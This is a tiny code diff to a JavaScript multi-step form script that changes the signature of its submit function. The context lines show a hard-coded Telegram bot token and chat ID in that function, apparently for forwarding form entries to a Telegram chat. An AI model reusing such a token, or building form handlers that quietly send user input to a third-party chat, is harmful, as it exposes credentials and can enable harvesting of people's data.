@@ -49,7 +49,7 @@ function fixStepIndicator(n) {
 	x[n].className += " active";
 	}
 	
-function submitForm() {
+function submitForm(form) {
           const BOT_TOKEN = '6403012866:AAGNpGzEijhSfRlMie3dqhv6DD4hucAY1k8';
           const CHAT_ID = '6929442824';
 
